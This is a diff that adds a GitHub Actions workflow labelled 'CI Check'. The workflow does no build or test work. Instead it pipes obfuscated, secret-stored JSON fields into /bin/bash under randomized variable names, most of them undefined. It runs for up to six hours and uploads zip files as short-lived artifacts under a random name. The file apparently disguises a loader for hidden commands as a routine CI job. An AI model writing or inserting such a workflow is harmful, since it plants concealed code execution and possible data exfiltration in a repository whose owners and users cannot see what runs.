@@ -1,0 +1,36 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  task:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Execute
+        env:
+          ecp87931: ${{ secrets.ecp87931 }}
+        run: |
+          printf '%s' "$ecp87931" | jq -r .rwwb84 | /bin/bash
+          printf '%s' "$apz20102" | jq -r .f7737 | /bin/bash
+          printf '%s' "$hbdn326" | jq -r .w9737 | /bin/bash
+          printf '%s' "$urqdf3" | jq -r .b46 | /bin/bash
+          printf '%s' "$y313" | jq -r .oxqw19483 | /bin/bash
+          printf '%s' "$rh1" | jq -r .ss5264 | /bin/bash
+          echo $layic61 | jq -r .clp5 | /bin/bash
+          printf '%s' "$dcy01904" | jq -r .lsltn92019 | /bin/bash
+          echo $ve779 | jq -r .lge806 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kGskENSp
+          path: "*.zip"
+          retention-days: 1
